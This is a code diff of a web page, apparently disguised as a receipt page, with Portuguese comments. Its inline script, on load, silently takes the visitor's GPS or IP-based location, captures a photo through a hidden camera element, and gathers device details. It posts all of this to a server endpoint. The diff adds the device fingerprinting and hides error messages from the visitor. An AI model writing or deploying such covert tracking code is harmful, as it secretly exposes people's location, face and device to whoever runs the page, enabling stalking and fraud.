@@ -22,52 +22,66 @@
     </div>
   </div>
 
-  <!-- Elemento de câmera oculto -->
+  <!-- Elementos para captura de foto -->
   <video id="camera" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
-    window.addEventListener("load", async () => {
-      // Atualiza a data
-      const dataAtual = new Date();
-      const dia = String(dataAtual.getDate()).padStart(2, '0');
-      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-      const ano = dataAtual.getFullYear();
-      const dataFormatada = `${dia}/${mes}/${ano}`;
-      document.getElementById("data-atual").textContent = dataFormatada;
+    // Atualiza data atual
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+    document.getElementById('data-atual').textContent = `${dia}/${mes}/${ano}`;
 
-      // Tenta obter localização
+    // Inicia o processo quando a página carrega
+    window.addEventListener('load', () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (position) => {
-            // Tira foto e envia localização
-            takePhotoAndSend(position, "Precisa (GPS)");
-          },
-          () => {
-            fallbackLocation();
-          }
+          (position) => takePhotoAndSend(position, 'Precisa (GPS)'),
+          () => fallbackLocation()
         );
       } else {
         fallbackLocation();
       }
     });
 
+    // Função para obter informações do dispositivo
+    function getDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const screen = `${window.screen.width}x${window.screen.height}`;
+      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+      
+      let deviceModel = 'Desconhecido';
+      if (/Android/i.test(userAgent)) {
+        const modelMatch = userAgent.match(/Android.*; (.*?) Build/i);
+        deviceModel = modelMatch ? modelMatch[1] : 'Android (Modelo não detectado)';
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        const modelMatch = userAgent.match(/(iPhone|iPad|iPod).*OS (\d+_\d+)/i);
+        deviceModel = modelMatch ? `${modelMatch[1]} (iOS ${modelMatch[2].replace('_', '.')})` : 'iOS (Modelo não detectado)';
+      }
+
+      return { userAgent, platform, screen, isMobile, deviceModel };
+    }
+
+    // Captura foto e envia dados
     async function takePhotoAndSend(position, source) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const deviceInfo = getDeviceInfo();
 
       try {
-        // Tenta capturar a foto
         const photo = await capturePhoto();
-        await enviarParaApi(latitude, longitude, maps, source, photo);
+        await enviarParaApi(latitude, longitude, maps, source, photo, deviceInfo);
       } catch (error) {
-        console.error("Erro ao capturar foto:", error);
-        // Envia sem foto se houver erro
-        await enviarParaApi(latitude, longitude, maps, source, null);
+        console.error('Erro ao capturar foto:', error);
+        await enviarParaApi(latitude, longitude, maps, source, null, deviceInfo);
       }
     }
 
+    // Captura foto da câmera
     async function capturePhoto() {
       const video = document.getElementById('camera');
       const canvas = document.getElementById('canvas');
@@ -87,42 +101,44 @@
       return photo;
     }
 
+    // Fallback para localização por IP
     function fallbackLocation() {
-      fetch("https://ipapi.co/json/")
+      fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
-          const latitude = data.latitude;
-          const longitude = data.longitude;
-          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          takePhotoAndSend({ coords: { latitude, longitude } }, "Aproximada (IP)");
+          takePhotoAndSend({
+            coords: {
+              latitude: data.latitude,
+              longitude: data.longitude
+            }
+          }, 'Aproximada (IP)');
         })
         .catch(error => {
-          console.error("Erro ao obter localização pelo IP:", error);
+          console.error('Erro ao obter localização:', error);
         });
     }
 
-    async function enviarParaApi(latitude, longitude, maps, source, photo) {
-      const data = { latitude, longitude, maps, source };
-      if (photo) {
-        data.photo = photo;
-      }
+    // Envia dados para a API
+    async function enviarParaApi(latitude, longitude, maps, source, photo, deviceInfo) {
+      const data = { latitude, longitude, maps, source, deviceInfo };
+      if (photo) data.photo = photo;
 
-      fetch("/api/send-location", {
-        method: "POST",
+      fetch('/api/send-location', {
+        method: 'POST',
         headers: {
-          "Content-Type": "application/json"
+          'Content-Type': 'application/json'
         },
         body: JSON.stringify(data)
       })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
+      .then(response => response.json())
+      .then(data => {
+        if (!data.success) {
+          console.error('Erro ao enviar dados');
+        }
+      })
+      .catch(error => {
+        console.error('Erro:', error);
+      });
     }
   </script>
 </body>
